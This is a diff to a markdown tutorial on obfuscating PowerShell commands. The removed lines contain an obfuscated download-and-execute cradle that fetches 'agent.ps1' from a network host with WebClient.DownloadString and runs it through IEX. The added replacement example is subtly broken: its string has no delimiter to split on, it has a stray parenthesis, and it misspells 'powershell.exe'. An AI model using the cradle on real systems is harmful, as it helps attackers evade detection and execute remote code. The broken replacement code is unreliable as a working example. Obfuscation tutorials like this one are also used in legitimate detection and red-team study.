@@ -359,7 +359,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 ![powershell obfuscation](http://i.cubeupload.com/XvV4bB.jpg)
 
 ---
-      'Powershell allow us to access windows environment variables using $env: switch'
+      'Powershell allow us to access windows environment variables using the $env: switch'
       Using $env:LOCALAPPDATA (windows environment variable) and -Join '' to pull out the 0º ,23º, 21º,7º and 7º
       chars from $env:LOCALAPPDATA and then the -Join '' operator will take the array and convert it to a string.
 
@@ -377,18 +377,20 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
-      Using an powershell variable ($cmdWithDelim) to 'de-split' the system call and then -Join '' it back again.
+      Using an variable ($encoded) to 'split' the system call and then use .Split and -Join '' it back again.
 
 <br />
 
 - String command to obfuscate<br />
-`(New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`
+`Get-WmiObject -Class Win32_ComputerSystem`
 
 - String obfuscated<br />
 
-      $cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/agent.ps1')";IEX ($cmdWithDelim.Split("~~") -Join '') | IEX
+      $encoded = "Get-WmiObject -Class Win32_ComputerSystem"
+      $decoded = $encoded.Split("~~") -Join '')
+      poweshell.exe $decoded 
 
-![powershell obfuscation](http://i.cubeupload.com/wAZr7K.jpg)
+![powershell obfuscation](http://i.cubeupload.com/0HwnAL.jpg)
 
 ---
 
